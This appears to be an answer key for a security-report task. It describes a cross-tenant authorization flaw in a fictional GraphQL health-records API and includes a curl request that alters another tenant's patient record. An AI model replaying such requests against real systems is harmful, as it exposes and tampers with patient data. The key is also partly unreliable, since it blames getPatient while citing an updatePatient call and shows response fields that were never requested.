# Expected Response

## System
- **Domain:** Healthcare / Electronic Health Records
- **System:** PatientCore EHR API
- **Example ID:** GQL-0201

## Priority Findings

### Finding 1: Healthcare EHR — BOLA via Bulk Endpoint updatePatient Exposes Cross-Tenant Patient Records (Pattern 1.3)
**Severity:** Critical
**Category:** BOLA / Bulk or List Endpoints

**Summary:**
Per §4.0 (RISK-GQL-201): The `getPatient` resolver fetches by `patientId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.3 — bulk or list endpoints): the bulk/list path allows cross-tenant patient record access when the caller supplies an unvalidated `patientId`. An attacker from `tenant-6112` submitted `updatePatient(id: "P-2201", input: {status: "approved", ownerId: "attacker-6112876b"})` against a patient record belonging to `tenant-876b`, receiving `CONFIDENTIAL-6112876b`. In Healthcare / EHR, unauthorized access to or modification of patient records constitutes a HIPAA violation with direct patient safety implications.

**Evidence from HAR:**
- Request: `POST https://api.patientcore-ehr-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-6112`
- Mutation: `updatePatient(id: "P-2201", input: {status: "approved", ownerId: "attacker-6112876b"}) { patientId status }`
- Response `200 OK`: `tenantId: "tenant-876b"`, `ownerId: "other-user-6112876b"`, `sensitiveField: "CONFIDENTIAL-6112876b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-6112876b`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-201 | getPatient resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.3 | Bulk/list endpoint returns cross-tenant patient data |
| HAR mutation | id: "P-2201" | Cross-tenant patient ID |
| HAR response | tenantId | tenant-876b returned to tenant-6112 |
| HAR response | sensitiveField | CONFIDENTIAL-6112876b |
| HAR header | x-request-id | req-6112876b |

## Steps to Reproduce

### Step 1 — updatePatient bulk BOLA cross-tenant EHR (HAR)
```bash
curl -s -X POST https://api.patientcore-ehr-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-6112" \
  -d '{"query": "mutation { updatePatient(id: \"P-2201\", input: {status: \"approved\", ownerId: \"attacker-6112876b\"}) { patientId status } }"}'
```
**Vulnerable:** `tenant-876b` patient record mutated, returns `CONFIDENTIAL-6112876b`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE patient_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `PatientInput`; derive from JWT.
3. PHI access must be logged with full audit trail.
4. Redis cache key: `patient:{tenantId}:{patientId}`.
